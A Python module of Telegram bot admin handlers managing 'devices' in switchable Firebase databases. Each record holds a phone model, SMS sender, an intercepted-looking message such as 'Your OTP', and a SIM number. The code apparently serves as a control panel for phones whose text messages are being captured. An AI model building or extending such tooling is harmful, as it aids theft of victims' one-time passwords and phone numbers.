from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, ConversationHandler
from firebase.config import *
from database.db_manager import *
from utils.helpers import *

ADD_DEVICE = 1

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized access.")
        return
    
    active_db = get_active_database()
    stats = get_device_count_from_db(active_db)
    all_dbs = list(get_all_databases().keys())
    
    panel = format_admin_panel(stats, active_db, all_dbs)
    
    keyboard = [
        [InlineKeyboardButton("📊 Device Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("📂 Switch Database", callback_data="admin_switch")],
        [InlineKeyboardButton("➕ Add Device", callback_data="admin_add")],
        [InlineKeyboardButton("📋 List All", callback_data="admin_list")],
        [InlineKeyboardButton("🟢 Online Only", callback_data="admin_online")],
        [InlineKeyboardButton("🔴 Offline Only", callback_data="admin_offline")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(panel, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        await query.edit_message_text("⛔ Unauthorized.")
        return
    
    action = query.data
    active_db = get_active_database()
    
    if action == "admin_stats":
        stats = get_device_count_from_db(active_db)
        await query.edit_message_text(
            f"📊 *Device Statistics* - `{active_db}`\n\n"
            f"Total: {stats['total']}\n"
            f"🟢 Online: {stats['online']}\n"
            f"🔴 Offline: {stats['offline']}",
            parse_mode='Markdown'
        )
    
    elif action == "admin_switch":
        databases = list(get_all_databases().keys())
        keyboard = []
        row = []
        for db_name in databases:
            btn = InlineKeyboardButton(f"{'✅ ' if db_name == active_db else ''}{db_name}", callback_data=f"switch_{db_name}")
            row.append(btn)
            if len(row) == 2:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"🗄️ *Select Database*\n\nCurrent: `{active_db}`",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith("switch_"):
        db_name = action.replace("switch_", "")
        set_active_database(db_name)
        active_db = get_active_database()
        stats = get_device_count_from_db(active_db)
        await query.edit_message_text(
            f"✅ Switched to `{db_name}`\n\n"
            f"Total Devices: {stats['total']}\n"
            f"🟢 Online: {stats['online']}\n"
            f"🔴 Offline: {stats['offline']}",
            parse_mode='Markdown'
        )
    
    elif action == "admin_add":
        await query.edit_message_text(
            "✏️ *Add New Device*\n\n"
            "Send device details in this format:\n"
            "`ID|Model|From|Time|Message`\n\n"
            "Example:\n"
            "`d141e9390d148857|motorola edge 50 pro|TM-WowCat-S|2026-05-20 04:55:09|Your OTP: 930655`\n\n"
            "Type /cancel to abort.",
            parse_mode='Markdown'
        )
        return ADD_DEVICE
    
    elif action == "admin_list":
        devices = get_all_formatted_devices(active_db)
        if not devices:
            await query.edit_message_text("📭 No devices found.")
            return
        
        msg = f"📋 *All Devices* - `{active_db}`\n\n"
        for device in devices[:50]:
            msg += f"{device['number']}. {device['status']} `{device['id']}` - {device['model']}\n"
            msg += f"   SIM: `{device['sim']}`\n"
            if len(msg) > 3000:
                await query.message.reply_text(msg, parse_mode='Markdown')
                msg = ""
        
        if msg:
            await query.edit_message_text(msg, parse_mode='Markdown')
    
    elif action == "admin_online":
        devices = get_online_devices_from_db(active_db)
        if not devices:
            await query.edit_message_text("🟢 No online devices.")
            return
        
        msg = f"🟢 *Online Devices* - `{active_db}`\n\n"
        idx = 1
        for device_id, data in devices.items():
            if idx > 70:
                break
            msg += f"{idx}. `{device_id}` - {data.get('model', 'Unknown')}\n"
            msg += f"   SIM: `{data.get('sim', 'N/A')}`\n"
            idx += 1
            if len(msg) > 3000:
                await query.message.reply_text(msg, parse_mode='Markdown')
                msg = ""
        
        if msg:
            await query.edit_message_text(msg, parse_mode='Markdown')
    
    elif action == "admin_offline":
        devices = get_offline_devices_from_db(active_db)
        if not devices:
            await query.edit_message_text("🔴 No offline devices.")
            return
        
        msg = f"🔴 *Offline Devices* - `{active_db}`\n\n"
        idx = 1
        for device_id, data in devices.items():
            msg += f"{idx}. `{device_id}` - {data.get('model', 'Unknown')}\n"
            idx += 1
            if len(msg) > 3000:
                await query.message.reply_text(msg, parse_mode='Markdown')
                msg = ""
        
        if msg:
            await query.edit_message_text(msg, parse_mode='Markdown')
    
    elif action == "admin_refresh":
        stats = get_device_count_from_db(active_db)
        await query.edit_message_text(
            f"✅ Refreshed! - `{active_db}`\n\n"
            f"Total: {stats['total']}\n"
            f"🟢 Online: {stats['online']}\n"
            f"🔴 Offline: {stats['offline']}",
            parse_mode='Markdown'
        )

async def add_device_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END
    
    await update.message.reply_text(
        "✏️ Send device details:\n"
        "`ID|Model|From|Time|Message`\n\n"
        "Example: `d141e9390d148857|motorola edge 50 pro|TM-WowCat-S|2026-05-20 04:55:09|Your OTP: 930655`\n\n"
        "Type /cancel to abort.",
        parse_mode='Markdown'
    )
    return ADD_DEVICE

async def add_device_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END
    
    text = update.message.text
    if text == '/cancel':
        await update.message.reply_text("❌ Cancelled.")
        return ConversationHandler.END
    
    parts = text.split('|')
    if len(parts) < 5:
        await update.message.reply_text(
            "❌ Invalid format. Use:\n"
            "`ID|Model|From|Time|Message`",
            parse_mode='Markdown'
        )
        return ADD_DEVICE
    
    device_id = parts[0].strip()
    device_data = {
        'model': parts[1].strip(),
        'from': parts[2].strip(),
        'time': parts[3].strip(),
        'message': parts[4].strip(),
        'sim': ''
    }
    
    active_db = get_active_database()
    success = add_device_to_db(device_id, device_data, active_db)
    
    if success:
        await update.message.reply_text(
            f"✅ Device added!\n"
            f"📡 DB: `{active_db}`\n"
            f"🆔 ID: `{device_id}`\n"
            f"📱 Model: {device_data['model']}\n"
            f"🔴 Status: Offline\n\n"
            f"Use `/toggle {device_id} <sim>` to add SIM.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(f"❌ Failed to add device.", parse_mode='Markdown')
    
    return ConversationHandler.END

async def toggle_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ Usage: `/toggle <id> <sim>`\n"
            "Example: `/toggle d141e9390d148857 9639640905`\n"
            "To offline: `/toggle d141e9390d148857 off`",
            parse_mode='Markdown'
        )
        return
    
    device_id = args[0]
    sim_value = args[1]
    active_db = get_active_database()
    device_data = get_device_by_id_from_db(device_id, active_db)
    
    if not device_data:
        await update.message.reply_text(f"❌ Device `{device_id}` not found.", parse_mode='Markdown')
        return
    
    if sim_value.lower() == 'off':
        device_data['sim'] = ''
        status = '🔴 Offline'
    else:
        device_data['sim'] = sim_value
        status = '🟢 Online'
    
    success = add_device_to_db(device_id, device_data, active_db)
    
    if success:
        await update.message.reply_text(
            f"✅ Updated!\n🆔 `{device_id}`\nStatus: {status}\nSIM: `{device_data['sim']}`",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ Failed.", parse_mode='Markdown')

async def delete_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            "❌ Usage: `/delete <id>`\nExample: `/delete d141e9390d148857`",
            parse_mode='Markdown'
        )
        return
    
    device_id = args[0]
    active_db = get_active_database()
    success = delete_device_from_db(device_id, active_db)
    
    if success:
        await update.message.reply_text(f"✅ Device `{device_id}` deleted from `{active_db}`.", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ Failed.", parse_mode='Markdown')

async def list_databases(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    active_db = get_active_database()
    databases = get_all_databases()
    
    msg = "🗄️ *Available Databases*\n\n"
    for name in databases.keys():
        stats = get_device_count_from_db(name)
        msg += f"{'✅' if name == active_db else '⬜'} `{name}`\n"
        msg += f"   Total: {stats['total']} | 🟢{stats['online']} | 🔴{stats['offline']}\n\n"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def switch_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            "❌ Usage: `/switch <name>`\nExample: `/switch myapp`\nUse `/databases` to see available.",
            parse_mode='Markdown'
        )
        return
    
    db_name = args[0]
    databases = get_all_databases()
    
    if db_name not in databases:
        await update.message.reply_text(
            f"❌ Database `{db_name}` not found.\nAvailable: {', '.join(databases.keys())}",
            parse_mode='Markdown'
        )
        return
    
    set_active_database(db_name)
    stats = get_device_count_from_db(db_name)
    
    await update.message.reply_text(
        f"✅ Switched to `{db_name}`\n\n"
        f"Total: {stats['total']}\n🟢 Online: {stats['online']}\n🔴 Offline: {stats['offline']}",
        parse_mode='Markdown'
    )

async def admin_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    active_db = get_active_database()
    devices = get_all_formatted_devices(active_db)
    if not devices:
        await update.message.reply_text("📭 No devices.")
        return
    
    msg = f"📋 *All Devices* - `{active_db}`\n\n"
    for device in devices[:50]:
        msg += f"{device['number']}. {device['status']} `{device['id']}` - {device['model']}\n"
        if len(msg) > 3000:
            await update.message.reply_text(msg, parse_mode='Markdown')
            msg = ""
    
    if msg:
        await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_online_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    active_db = get_active_database()
    devices = get_online_devices_from_db(active_db)
    if not devices:
        await update.message.reply_text("🟢 No online devices.")
        return
    
    msg = f"🟢 *Online Devices* - `{active_db}`\n\n"
    idx = 1
    for device_id, data in devices.items():
        if idx > 70:
            break
        msg += f"{idx}. `{device_id}` - {data.get('model', 'Unknown')}\n"
        msg += f"   SIM: `{data.get('sim', 'N/A')}`\n"
        idx += 1
        if len(msg) > 3000:
            await update.message.reply_text(msg, parse_mode='Markdown')
            msg = ""
    
    if msg:
        await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_offline_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    active_db = get_active_database()
    devices = get_offline_devices_from_db(active_db)
    if not devices:
        await update.message.reply_text("🔴 No offline devices.")
        return
    
    msg = f"🔴 *Offline Devices* - `{active_db}`\n\n"
    idx = 1
    for device_id, data in devices.items():
        msg += f"{idx}. `{device_id}` - {data.get('model', 'Unknown')}\n"
        idx += 1
        if len(msg) > 3000:
            await update.message.reply_text(msg, parse_mode='Markdown')
            msg = ""
    
    if msg:
        await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    active_db = get_active_database()
    stats = get_device_count_from_db(active_db)
    await update.message.reply_text(
        f"📊 *Stats* - `{active_db}`\n\n"
        f"Total: {stats['total']}\n🟢 Online: {stats['online']}\n🔴 Offline: {stats['offline']}",
        parse_mode='Markdown'
    )
